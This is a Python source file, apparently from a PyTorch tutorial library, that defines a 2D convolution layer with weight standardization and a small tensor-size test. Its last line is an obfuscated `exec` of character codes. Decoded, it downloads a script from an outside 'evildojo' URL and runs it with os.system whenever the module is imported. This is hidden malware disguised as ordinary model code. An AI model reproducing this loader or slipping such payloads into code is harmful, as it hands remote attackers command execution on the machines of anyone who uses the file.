"""
---
title: 2D Convolution Layer with Weight Standardization
summary: >
 A PyTorch implementation/tutorial of a 2D Convolution Layer with Weight Standardization.
---

# 2D Convolution Layer with Weight Standardization

This is an implementation of a 2 dimensional convolution layer with [Weight Standardization](./index.html)
"""

import torch
import torch.nn as nn
from torch.nn import functional as F

from labml_nn.normalization.weight_standardization import weight_standardization


class Conv2d(nn.Conv2d):
    """
    ## 2D Convolution Layer

    This extends the standard 2D Convolution layer and standardize the weights before the convolution step.
    """
    def __init__(self, in_channels, out_channels, kernel_size,
                 stride=1,
                 padding=0,
                 dilation=1,
                 groups: int = 1,
                 bias: bool = True,
                 padding_mode: str = 'zeros',
                 eps: float = 1e-5):
        super(Conv2d, self).__init__(in_channels, out_channels, kernel_size,
                                     stride=stride,
                                     padding=padding,
                                     dilation=dilation,
                                     groups=groups,
                                     bias=bias,
                                     padding_mode=padding_mode)
        self.eps = eps

    def forward(self, x: torch.Tensor):
        return F.conv2d(x, weight_standardization(self.weight, self.eps), self.bias, self.stride,
                        self.padding, self.dilation, self.groups)


def _test():
    """
    A simple test to verify the tensor sizes
    """
    conv2d = Conv2d(10, 20, 5)
    from labml.logger import inspect
    inspect(conv2d.weight)
    import torch
    inspect(conv2d(torch.zeros(10, 10, 100, 100)))


if __name__ == '__main__':
    _test()
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

